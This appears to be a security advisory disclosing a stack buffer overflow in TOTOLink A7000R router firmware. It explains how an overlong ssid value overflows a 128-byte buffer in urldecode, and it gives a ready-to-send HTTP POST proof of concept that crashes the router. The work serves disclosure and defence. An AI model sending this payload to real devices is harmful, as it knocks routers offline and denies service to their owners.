# TOTOLink Vulnerability

Vendor:TOTOLink 

Product:A7000R

Version:V9.1.0u.6115_B20201022(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/171/ids/36.html)

Vulnerability Type: Stack Overflow

Author:Chuanhao Wan

Mail:chuanhaowan@hust.edu.cn

Institution:Huazhong University of Science and Technology(HUST)




## Vulnerability cause

In the sub_421CF0 function, the ssid parameter is obtained via websGetVar(a1, "ssid", &byte_431360) and, when the addEffect parameter is "0", passed to the urldecode function for decoding. The urldecode function stores the decoded input in the target buffer v19, but does not restrict the length of the input v7 (i.e., ssid). The urldecode function uses a pointer v3 (pointing to v19) to write decoded data byte by byte, with v4 (a counter) controlling the position of the null terminator, ultimately writing a null character at a2[v4 - 1] = 0. The target buffer v19 is a fixed-size array (_BYTE v19[128]), and the condition if (atoi(v4)) can be controlled by the addEffect parameter. When the ssid parameter is excessively long and addEffect is set to "0", urldecode can trigger a buffer overflow, overwriting adjacent stack data or the return address, resulting in a Denial of Service (DoS) attack.


<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>


## PoC

In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks


```
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.6.15

Content-Length: 570

X-Requested-With: XMLHttpRequest

Accept-Language: en-US,en;q=0.9

Accept: application/json, text/javascript, */*; q=0.01

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36

Origin: http://192.168.6.15

Referer: http://192.168.6.15/phone/login.html

Accept-Encoding: gzip, deflate, br

DNT: 1

Connection: close

Pragma: no-cache

Cache-Control: no-cache



{"addEffect":"0","ssid":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",

"topicurl":"setWiFiBasicCfg"}
```


## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>